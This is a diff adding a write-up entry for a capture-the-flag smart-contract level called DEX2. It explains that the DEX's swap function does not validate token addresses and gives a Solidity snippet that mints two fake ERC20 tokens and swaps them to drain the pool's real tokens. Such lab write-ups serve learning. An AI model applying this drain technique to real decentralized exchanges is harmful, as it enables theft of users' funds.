@@ -362,4 +362,21 @@ fallback() external payable {
           110     45    |   0       65   
           0       90    |   110     20
 
-#22. 
+#22. DEX2
+* Unlike challange 21 above here lack of valdation for token 1 and token 2 in swap function will make us take the advantage.
+* Creating 2 evil ERC20 token and passing 1 token of each to the DEX2 contract will allow us to take all the token1 and token2.
+* Then swapping 1 of each evil token for 100 of both token1 and token2 will make us pass this level. 
+* A snippet of the Hack contract is shown below.
+```
+        evilToken1.mint(2);
+        evilToken2.mint(2);
+
+        evilToken1.transfer(address(dex), 1);
+        evilToken2.transfer(address(dex), 1);
+
+        evilToken1.approve(address(dex), 1);
+        evilToken2.approve(address(dex), 1);
+
+        dex.swap(address(evilToken1), address(token1), 1);
+        dex.swap(address(evilToken2), address(token2), 1);
+```
